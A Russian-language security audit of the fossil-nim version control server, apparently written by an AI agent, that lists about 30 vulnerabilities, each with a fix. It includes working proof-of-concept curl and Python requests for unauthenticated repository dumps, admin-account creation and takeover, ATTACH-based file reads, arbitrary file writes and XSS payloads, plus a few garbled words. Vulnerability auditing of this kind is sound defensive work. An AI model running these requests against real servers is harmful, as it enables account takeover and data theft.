# 🛡️ Fossil-Nim: полный аудит безопасности (2026-10-19)

> **Аудитор:** Arena.ai Agent Mode (агент NebulaCyber568)
> **Объект:** `nc568/fossil-nim`, версия 2.26.0-nim, ветка main, коммит от 18–19.10.2026
> **Объём:** 100 % кодовой базы (~27 500 строк Nim + JS/HTML): VCS-ядро, storage-бэкенды (SQLite/CDB/LMDB/LMDBX/hybrid), sync-протокол, REST API, WebUI (legacy HTML + SPA `web_new`), MCP-сервер (65+ инструментов), TH1-интерпретатор, Markdown-парсер, CLI.
> **Методика:** ручной код-ревью всех обработчиков ввода → сборка из исходников (`nim c -d:release --mm:arc`) → **живая эксплуатация** каждой находки на локальном сервере → автоматизированный PoC-комплект `poc/poc_all.py` (34 проверки, **33 подтверждены уязвимыми**, 1 контрольная — «не уязвимо»).
> **PoC:** [`poc/poc_all.py`](https://github.com/nc568/fossil-nim/blob/main/poc/poc_all.py) — запускается без зависимостей (Python 3 stdlib) против живого сервера.

---

## 0. Сводка

| Severity | Кол-во | Ключевые |
|---|---|---|
| 🔴 P0 Critical | 6 | SEC-01, SEC-02, SEC-03, SEC-04, SEC-16, SEC-28 |
| 🟠 P1 High | 8 | SEC-06, SEC-07, SEC-08, SEC-12, SEC-13, SEC-14, SEC-23, SEC-30 |
| 🟡 P2 Medium | 14 | SEC-05, SEC-10, SEC-11, SEC-15, SEC-17, SEC-18, SEC-19, SEC-20, SEC-21, SEC-24, SEC-26, SEC-27, SEC-29 + SEC-02b |
| 🟢 P3 Low | 3 | SEC-22, SEC-25, SEC-15 (частично) |

**Главный вывод:** экземпляр fossil-nim, развёрнутый «как есть», полностью компрометируется **без какой-либо аутентификации**: любой участник сети читает весь репозиторий, пишет в него произвольные артефакты, создаёт администраторов, выполняет произвольный SQL (ATTACH), создаёт файлы в любой writable-директории и проводит stored-XSS в браузерах администраторов. Предыдущие аудиты (K9L-12, K9L-19…K9L-22) зафиксировали часть проблем, но **ни одна из четырёх security-задач K9L-19–22 не закрыта в коде** — все четыре воспроизведены живьём.

### Что из предыдущих аудитов действительно работает (проверено живьём)
- ✅ Markdown-санитизатор: `javascript:`/`data:text/html` → `#unsafe-link` (SEC-09 контрольная проверка — ОК).
- ✅ `isSafeRelativePath` в парсере манифестов и конфайнмент `materializeCheckout` (traversal `../` блокируется).
- ✅ Лимиты TH1 (50 000 шагов / 10 000 итераций).
- ✅ CSRF-токены на `/login` и `/setup` (но не на API — см. SEC-14).
- ✅ CSPRNG (`sysrand.urandom`) для session-id и CSRF-токенов.
- ✅ Параметризованные запросы (`?1` bind) в большинстве новых запросов.
- ✅ `SQLITE_OPEN_READONLY` для `/api/v1/sql` и `fossil_sql` (но ATTACH всё ещё работает — SEC-13).

### Что НЕ реализовано из предыдущих аудитов (всё воспроизведено)
- ❌ K9L-19: `/xfer` и `/clone` по-прежнему без авторизации (SEC-01, SEC-02).
- ❌ K9L-20: `putBlob` по-прежнему не проверяет `hash(data) == uuid` (SEC-06).
- ❌ K9L-21: MCP/HTTP по-прежнему без токена, с `validateOrigin()==true` и CORS `*` (SEC-03).
- ❌ K9L-22: пароли по-прежнему SHA-1 без соли, сравнение `==` (SEC-17), токен в `?token=` (SEC-05), cookie без `Secure` (SEC-18), лимита попыток нет (SEC-20).

---

## 1. 🔴 P0 — Критические

### SEC-01. `GET /clone` без авторизации: полный дамп репозитория
**Файл:** `src/fossil/api/rest.nim` (обработчик `/clone` внутри `startApiServer`), ~строка 2300.
**PoC (живьём):**
```bash
curl http://127.0.0.1:8099/clone
# HTTP 200, тело: "file 0000...0000 5\nHELLO\nfile 889c19... \nC <img src=x ...>\n..."
```
**Доказательство:** ответ содержит все блобы, включая wiki-текст, тикеты, forum, chat, таблицу `user` с хешами паролей.
**Impact:** полное раскрытие исходников, приватных данных и хешей паролей (unsalted SHA-1 — см. SEC-17 — мгновенно подбираются офлайн).
**Фикс:**
```nim
elif req.url.path == "/clone" and $req.reqMethod == "GET":
  if not checkAuth(req):            # <-- добавить
    await req.respond(Http401, "unauthorized", secHeaders("text/plain"))
    found = true
```
и убрать `("Access-Control-Allow-Origin","*")` из ответа (SEC-10).

### SEC-02. `POST /xfer` без авторизации: пуш артефактов и форж истории
**Файл:** `src/fossil/api/rest.nim` (обработчик `/xfer`).
**PoC (живьём):**
```python
# poc/poc_all.py, SEC-02
manifest = "C <img src=x onerror=alert('pwned-by-xfer')>\nD ...\nF README.md da39a...\nP ...\nU attacker\nB trunk\nZ ..."
# POST /xfer: "file <sha1(manifest)> <len>\n<manifest>\n"
```
Сервер: (1) принимает блоб через `putBlob` без проверки хеша; (2) **самостоятельно перестраивает таблицу `event`** из карт манифеста — поля `U` (автор), `C` (комментарий), `R/B` (ветка) полностью контролируются атакующим.
**Impact:** анонимная запись в репозиторий, подделка коммитов от имени любого пользователя, хранимая XSS (SEC-02b: payload попал в `/api/v1/timeline` и рендерится в SPA без экранирования).
**Фикс:** требовать аутентификацию (Bearer/сессия), проверять `hash(data)==uuid`, валидировать `U/C/B` (длина, символы), кап на размер и количество карт, rate-limit.

### SEC-03. MCP-over-HTTP: ноль аутентификации, `validateOrigin()` всегда `true`, CORS `*`
**Файл:** `src/fossil/mcp/server.nim`, строки 2734–2741 (`validateOrigin`), 2750–2760 (заголовки), 2761+ (обработчики `/mcp`, `/sse`, `/message`).
**PoC (живьём):**
```bash
curl -s http://127.0.0.1:3000/mcp -H 'Content-Type: application/json' \
  -H 'Origin: https://evil.example' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"fossil_user_list","arguments":{}}}'
# HTTP 200, список пользователей
```
`FOSSIL_API_TOKEN` в MCP не используется вообще. `Access-Control-Allow-Origin: *` на каждом ответе.
**Impact:** любая открытая веб-страница (через fetch/DNS-rebinding на `localhost:3000`) вызывает `fossil_commit`, `fossil_config_set`, `fossil_user_create`, `fossil_rebuild`, `fossil_sql`.
**Фикс:** bearer-токен из `FOSSIL_API_TOKEN` (заголовок `Authorization`, НЕ query), бел名单 Origin/Host, убрать `ACAO: *`, CSRF-токен для browser-реквестов, отключить `/message`-автосоздание очередей.

### SEC-04. `fossil_user_create`: пароль в открытом виде + админ-права, без авторизации
**Файл:** `src/fossil/mcp/server.nim`, ветка `of "fossil_user_create"` (~строка 2264–2300).
**PoC (живьём):**
```bash
curl -s http://127.0.0.1:3000/mcp -H 'Content-Type: application/json' -d '{
 "jsonrpc":"2.0","id":1,"method":"tools/call",
 "params":{"name":"fossil_user_create","arguments":{"login":"eviladmin","password":"hunter2","capabilities":"as"}}}'
# {"text":"User eviladmin created with cap as"}
curl -s -H "Authorization: Bearer tok" --data '{"query":"SELECT login,pw,cap FROM user"}' \
     http://127.0.0.1:8099/api/v1/sql
# {"rows":[{"login":"eviladmin","pw":"hunter2","cap":"as"}]}   <-- ПАРОЛЬ ОТКРЫТЫМ ТЕКСТОМ
```
**Цепочка захвата аккаунта (SEC-04c):** т.к. `verifyPassword` сравнивает `hashPassword(input) == stored`, создав пользователя с `password=<SHA1-HEX УБОЧНЫМИ БУКВАМИ>`, атакующий входит под этим логином с нормальным паролем:
```python
pw_hash = hashlib.sha1(b"Password123").hexdigest().upper()  # Nim $secureHash — uppercase
mcp_call("fossil_user_create", {"login":"pwnuser","password":pw_hash,"capabilities":"as"})
# -> POST /login user=pwnuser password=Password123 -> 200 + Set-Cookie: session=...
```
**Impact:** анонимное создание администраторов, раскрытие паролей, полный takeover инстанса.
**Фикс:** хешировать через KDF (SEC-17), требовать auth+admin для создания юзеров, проверить `cap` против белого списка.

### SEC-16. `fossil_rebuild`: создание файлов в произвольном пути + чтение любых SQLite-файлов
**Файл:** `src/fossil/mcp/server.nim` (`fossil_rebuild`), `src/fossil/storage/hybrid_backend.nim` (`migrateToHybrid`, `copyAllTablesViaAttach`).
**PoC (живьём):**
```bash
curl -s http://127.0.0.1:3000/mcp -H 'Content-Type: application/json' -d '{
 "jsonrpc":"2.0","id":1,"method":"tools/call",
 "params":{"name":"fossil_rebuild","arguments":{"oldRepo":"/home/user/audit-test/repo.fossil","newRepo":"/tmp/pwned-by-mcp.fossil","backend":"hybrid-cdb"}}}'
# "Rebuild done: migrated 6 blobs ..." ; файл /tmp/pwned-by-mcp.fossil создан
```
`copyAllTablesViaAttach` фильтрует только `'` и `;` в **источнике**; **назначение** (`newRepo`) не ограничено вообще. `ATTACH DATABASE '<path>'` читает любой SQLite-файл, доступный пользователю сервера.
**Impact:** запись/перезапись файлов в любой writable-директории (до перезаписи конфигов/ключей при совпадении формата), чтение чужих `.fossil`-репозиториев.
**Фикс:** белый список директорий для oldRepo/newRepo, запрет ATTACH к произвольным путям (URI-флаги SQLite `SQLITE_OPEN_NOFOLLOW`), права админа.

### SEC-28. Sync-протокол: нет аутентификации, replay-защиты, подписей
**Файлы:** `src/fossil/sync/protocol.nim`, `src/fossil/sync/http.nim`, обработчик `/xfer`.
Нет challenge/cookie-хэндшейка (в отличие от настоящего Fossil), нет nonce/таймстампов (захваченный бандл можно переиграть), `parseCards` доверяет размерам из карты, `syncExchangeSqlite` отвечает `gimme` на любой неизвестный uuid → полный перебор содержимого.
**Фикс:** mutual auth, размерные лимиты, nonce+timestamp, подпись карт.

---

## 2. 🟠 P1 — Высокие

### SEC-06. `putBlob` не проверяет `hash(data) == uuid`
**Файл:** `src/fossil/storage/sqlite_backend.nim:277` (и cdb/lmdb/libmdbx/hybrid — везде).
`utils/hash.nim` содержит `verifyHash()`, но `putBlob` её **не вызывает**.
**PoC:** `POST /xfer: file ffffffffffffffffffffffffffffffffffffffff 43\ntampered content...` → HTTP 200, блоб сохранён под чужим UUID.
**Impact:** разрушение content-addressable модели: подмена содержимого любого артефакта → отравление diff/blame/checkout/archive.
**Фикс:**
```nim
proc putBlob*(b: var SqliteBackend, uuid: Uuid, data: Blob, isDelta=false): FossilResult[Rid] =
  let expect = if uuid.isSha3: hashBlob(data, true) else: hashBlob(data, false)
  if string(expect) != string(uuid):
    return err[Rid](feSecurityError, "uuid does not match content hash", string(uuid))
  ...
```

### SEC-07. Stored XSS через `fossil_ticket_create` (MCP, без auth) → SPA
**Цепь:** `mcp/server.nim` `fossil_ticket_create` (без auth) → `ticket.title` в БД → `web_new/js/components/ticket.js:27` `` `${t.title||''}` `` в `innerHTML` **без escapeHtml**; legacy `extended_pages.nim:245` тоже без экранирования.
**PoC (живьём):** создан тикет с `title=<img src=x onerror=alert(document.cookie)>`; `/api/v1/ticket/list` возвращает title в открытом виде.
**Фикс:** экранировать всё пользовательское вводимое в JS-рендерерах (`escapeHtml`), экранировать в Nim-шаблонах.

### SEC-08. Wiki `format=html` — raw HTML (stored XSS); `format=th1` — серверное исполнение
**Файл:** `src/fossil/wiki/wiki.nim` `renderWikiPage` (строки ~215–260): `elif page.format == "html": result = content` — verbatim. `format` приходит из запроса (`handleWikiSave` берёт `params["format"]` без валидации). `<th1>`/`<?th1` исполняется на сервере при каждом просмотре (`GET /api/v1/wiki/get` — **без auth**).
**PoC (живьём):**
```bash
curl -X POST -H "Authorization: Bearer tok" http://127.0.0.1:8099/api/v1/wiki/save \
  -d '{"name":"xsspage","format":"html","content":"<script>alert(1)</script>"}'
curl http://127.0.0.1:8099/api/v1/wiki/get?name=xsspage   # -> "html":"<script>alert(1)</script>"
```
SPA рендерит `r.data.html` через `innerHTML` (`wiki.js:120`) → XSS.
**Фикс:** белый список format ∈ {markdown, th1}; html-флаг только для доверенных админов; TH1 — sandbox без возможности расширения (SEC-27).

### SEC-12. Исчерпание памяти через поддельный заголовок размера блоба (zip-bomb class)
**Файл:** `src/fossil/storage/sqlite_backend.nim` `decompressBlob`.
```nim
let origSize = (uint32(b0) shl 24) or ...   # из 4 байт заголовка — атакуемый
if origSize > 0 and origSize < 100_000_000'u32:
  var outStr = newString(int(origSize))   # аллокация до 100 МБ на блоб
```
**PoC (живьём):** 36-байтный блоб с заголовком BE32(99 999 999) принят через `/xfer`. Сотня таких блобов → десятки ГБ аллокаций → OOM-kill.
**Фикс:** проверять сжатое/несжатое отношение, лимит суммарной аллокации на запрос, `uncompress` с постепенным ростом буфера.

### SEC-13. `/api/v1/sql` и `fossil_sql`: ATTACH произвольных файлов
`SQLITE_OPEN_READONLY` защищает только **основную** БД. `ATTACH DATABASE '<path>' AS x` открывает любой читаемый SQLite-файл (другие репозитории, сессии, конфиги).
**PoC (живьём):** `POST /api/v1/sql {"query":"ATTACH DATABASE '/home/user/audit-test/repo.fossil' AS s2; SELECT name FROM s2.sqlite_master"}` → HTTP 200 с содержимым чужой БД.
**Фикс:** запретить `ATTACH/DETACH` и `PRAGMA` на уровне препроцессора запроса (белый список операторов), `sqlite3_set_authorizer` с `SQLITE_ATTACH`→deny.

### SEC-14. Mutating API-эндпоинты без CSRF-защиты (только cookie-auth)
CSRF проверяется только на `/login` и `/setup`. Все `ApiRoute`-обработчики (`commit`, `wiki/save`, `ticket/create`, `forum/*`, `chat/send`, `repo/import`…) доверяют cookie целиком.
**PoC (живьём):**
```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8099/api/v1/chat/send \
  -H "Origin: https://evil.example" -H "Content-Type: text/plain" \
  -d '{"room":"main","user":"admin3","content":"CSRF: cookie-only auth works"}'
# HTTP 200, сообщение отправлено от имени admin3
```
(Form `enctype=text/plain` обходит preflight; ACAO:* на ответах только помогает читать, но действие уже выполнено.)
**Фикс:** требовать CSRF-токен (или `Origin`-check) на всех state-changing эндпоинтах при cookie-авторизации.

### SEC-23. Рекурсия delta-цепочек без детекта циклов → StackOverflow
**Файл:** `src/fossil/storage/sqlite_backend.nim` `getBlob`:
```nim
let srcRes = b.getDeltaSrc(rid)
if srcRes.isOk and srcRes.value.isSome:
  let srcBlobRes = b.getBlob(srcRid)   # рекурсия без лимита глубины
```
Циклическая delta-цепочка (A→B→A) или цепь из ~100k дельт (обе внедряемы через `/xfer` + SQL) → stack overflow процесса.
**Фикс:** итеративное разворачивание с `seen`-множеством rid и лимитом глубины (например, 1000).

### SEC-30. `/setup/*`: любой авторизованный пользователь становится админом
**Файл:** `src/fossil/api/rest.nim` (`/setup/user/new`, `/setup/user/edit`, `/setup/config`).
Проверяется только валидность сессии; поле `cap` принимается из тела запроса, `INSERT OR REPLACE INTO user` перезаписывает и существующих пользователей; `currentUser` захардкожен (`# TODO get from session via sid`).
**Impact:** первый же зарегистрированный аккаунт (или аккаунт из SEC-04) получает `as`-права, меняет конфиг и пароли других пользователей.
**Фикс:** проверять `user.isAdmin` сессии, убрать `cap` из запроса (только admin может менять cap), заменить INSERT OR REPLACE на INSERT.

---

## 3. 🟡 P2 — Средние

### SEC-05. Токен API принимается в `?token=`
`checkAuth` (`rest.nim` ~строка 196): `for pair in req.url.query.split("&"): if pair.startsWith("token=")`.
**PoC (живьём):** `POST /api/v1/sql?token=supersecrettoken123` → 200; без токена → 401.
**Impact:** токен в access-логах, логах прокси, истории браузера, заголовке `Referer`.
**Фикс:** только заголовок `Authorization: Bearer`.

### SEC-02b / SEC-21. Stored XSS в SPA: рендер без экранирования
`web_new/js/components/timeline.js:53,58` (`${e.user}`, `${e.comment}`), `ticket.js:27,52` (`${t.title}`), `forum.js:207` (`p.title`, `p.user`) — все через `innerHTML` без `escapeHtml`. Источники данных — forgeable без auth (SEC-02/SEC-07). Legacy Nim-страницы (`timeline.nim:11`, `extended_pages.nim:245,328`, `info_page.nim:116-119,134`, `setup_page.nim:107,115,125,149`, `wiki.nim:13-15`, `assets.nim:277`) — аналогично.
**Фикс:** единая функция экранирования в JS и Nim; CSP без `'unsafe-inline'` (см. SEC-31 замечание ниже).

### SEC-10. `Access-Control-Allow-Origin: *` на всех ответах, включая авторизованные
И REST (`startApiServer` добавляет ACAO:* к каждому `respond`), и MCP. При `?token=`-авторизации (SEC-05) любой origin читает API с украденным токеном.
**Фикс:** убрать wildcard; отражать проверенный Origin из белого списка.

### SEC-11. `POST /api/v1/chat/send` — без auth, произвольное имя отправителя
**PoC (живьём):** анонимный POST с `"user":"admin"` → сообщение от admin. Спуфинг, социнженерия, спам.
**Фикс:** auth обязателен; `user` брать из сессии, а не из тела.

### SEC-15. Предсказуемые sessionId в legacy MCP SSE
`runSseLoop`: `sessionId = $getTime().toUnix() & "_" & $rand(1000000)`; `rand` без `randomize` детерминирован; `/message` принимает любой sessionId без проверки.
**Фикс:** CSPRNG (`sysrand.urandom`), привязка к клиенту, TTL.

### SEC-17. Пароли: SHA-1 без соли, сравнение через `==`
`web/pages/login_page.nim`:
```nim
proc hashPassword*(password: string): string = $secureHash(password)   # std/sha1, без соли
proc verifyPassword*(password, hash: string): bool = hashPassword(password) == hash
```
**Impact:** одинаковые пароли → одинаковые хеши (радужные таблицы), offline-крекинг после SEC-01, timing-оракул.
**Фикс:** Argon2id (nim argon2 / через OpenSSL `EVP_PBE_scrypt`/`PKCS5_PBKDF2_HMAC`) + per-user salt + `crypto.utils.secureCompare`.

### SEC-18. Cookie сессии без `Secure`
`rest.nim` ~строка 3028: `"session=" & sid & "; Path=/; HttpOnly; SameSite=Strict"` — нет `Secure`.
**PoC (живьём):** `Set-Cookie: session=s_6UoK...; Path=/; HttpOnly; SameSite=Strict`.
**Фикс:** добавить `; Secure` (и `__Host-` prefix при HTTPS).

### SEC-19. Open redirect + JS-инъекция через `/login?redirect=`
`renderLoginSuccess` подставляет `redirect` в `<meta http-equiv='refresh' content='1;url="...">`, в `window.location.href='...'` и `localStorage.setItem('fossil_user','<session.user>')` — без экранирования; `renderLoginPage` — в value атрибут.
**PoC (живьём):** `POST /login` с `redirect=';alert(document.domain)//` → страница успеха содержит:
```js
window.location.href = '';alert(document.domain)//';
```
**Фикс:** белый список путей (начинается с `/`, без `//` и `:`), экранирование во всех контекстах.

### SEC-20. Нет rate-limit/lockout на `/login`
**PoC (живьём):** 5 неверных попыток за 0.01 с → все HTTP 401 без задержки.
**Фикс:** экспоненциальная задержка, lockout, captcha после N попыток.

### SEC-24. CSRF-хранилище: глобальное, не привязано к сессии, не очищается
`gCsrfTokens` — process-global table; токен пользователя A валиден для POST пользователя B; `cleanupCsrfTokens()` нигде не вызывается → утечка памяти (DoS через флуд `/login`).
**Фикс:** привязка токена к sid/user, периодическая GC, лимит на процесс.

### SEC-26. `X-Forwarded-For` доверяется как IP сессии
`createSessionSqlite(db, user, $req.headers.getOrDefault("X-Forwarded-For"))` — значение заголовка клиента записывается в БД.
**Фикс:** брать IP из `req.address` (или доверенного proxy-списка), валидировать формат.

### SEC-27. TH1-исполнение достижимо из сохранённого контента
`renderWikiPage` исполняет `<th1>…</th1>` и `format=="th1"` при каждом просмотре (`/api/v1/wiki/get` — без auth; MCP `fossil_wiki_get` тоже). Текущий набор команд TH1 (set/puts/if/foreach/while/proc/expr/string/list/dict) не включает file/exec — поэтому сегодня это «только» ограниченный CPU-burn, но движок в одном `exec` builtin от RCE. Воспринимать как RCE-adjacent: не исполнять TH1 из user-содержимого без явного админ-флага.

### SEC-29. Timing-оракулы в auth-сравнениях
`checkAuth` и `verifyPassword` используют `==` (early-exit). Фикс: constant-time compare.

---

## 4. 🟢 P3 — Низкие

- **SEC-22.** Reflected XSS в 404-обработчиках: `web/server.nim` и `web/router.nim` (`"404 Not Found: " & path`), финальный 404 в `startApiServer` (`"<p>" & req.url.path & "</p>"`) — достижим, когда `web_new/index.html` отсутствует (а `getWebDir` ищет и в `/home/nc568/...` — см. SEC-25).
- **SEC-25.** Загардкоженный абсолютный путь разработчика в `getWebDir()`; `/api/v1/status` (без auth) раскрывает пути к репозиторию; `/api/v1/health` — бэкенды и размеры бинарей.
- Замечание (SEC-31): CSP ослаблен `script-src 'self' 'unsafe-inline'` — при наличии stored XSS (SEC-07/08/21) inline-сценарии выполняются; `'unsafe-inline'` стоит убрать после перехода на nonce/хеши.

---

## 5. Дополнительные наблюдения (без отдельных секций)

1. `sync/http.nim cloneFromUrl`: JSON-ветвь парсинга бандла использует `content` как raw (комментарий «assume not base64») — несогласованность форматов → потенциальная порча данных.
2. `parseCards` принимает отрицательные/гигантские `size` без верхней границы → большие срезы/аллокации.
3. `renderLoginPage`/`renderLoginSuccess` инжектят `session.user` в JS — stored XSS через имя пользователя.
4. `getWebDir()` резолвит `web_new` из CWD-следов — на проде это непредсказуемо.
5. `fossil_archive` MCP-инструмент возвращает лишь список файлов (LIMIT 100) — не уязвимость, но заявленный функционал не реализован (док/код расхождение).
6. `examples/api_client.py`, `examples/mcp_client.py` — учебные; секретов не содержат. `scripts/sync_project_to_linear.py` читает ключ из env (ок).
7. `bin-tools/`, `benchmarks/*` содержат скомпилированные артефакты в репо — не рекомендуется коммитить бинари (нет .gitignore-исключения).

---

## 6. Порядок исправлений (рекомендация)

1. **Срочно (P0):** auth на `/clone`, `/xfer`, MCP HTTP (токен в Authorization), хеширование паролей (Argon2id/scrypt), проверка `hash(data)==uuid` в `putBlob`, whitelist путей в `fossil_rebuild`/`migrateToHybrid`.
2. **Высоко (P1):** escape всего пользовательского ввода в HTML/JS-рендерерах, запрет `format=html`/`th1` по умолчанию, CSRF на state-changing API, лимиты аллокации в `decompressBlob`, запрет ATTACH в `/api/v1/sql` и `fossil_sql`, итеративный `getBlob` с лимитом глубины, admin-check в `/setup/*`.
3. **Средне (P2):** убрать `?token=`, убрать ACAO:*, Secure на cookie, rate-limit login, CSRF-токены per-session, constant-time compare, валидация XFF, predictable sessionId → CSPRNG, `redirect` whitelist.
4. **Низко (P3):** экранирование 404-страниц, удалить хардкод путей, убрать `unsafe-inline` из CSP после рефактора.

---

## 7. Воспроизведение

```bash
git clone https://github.com/nc568/fossil-nim && cd fossil-nim
make                                   # Nim 2.2+; нужны sqlite3, zlib, openssl
./bin/fossil init demo.fossil
FOSSIL_REPO=$PWD/demo.fossil FOSSIL_API_TOKEN=supersecrettoken123 ./bin/fossil server --api-enable -P 8099 &
FOSSIL_REPO=$PWD/demo.fossil ./bin/fossil-mcp --sse --port 3000 &
python3 poc/poc_all.py http://127.0.0.1:8099 http://127.0.0.1:3000
# Итог: 33/34 проверок VULNERABLE (SEC-09 — контрольная, ОК)
```

Полный текст отчёта и PoC также лежат в репозитории: `docs/SECURITY_AUDIT_2026-10-19_FULL_RU.md`, `poc/poc_all.py`.
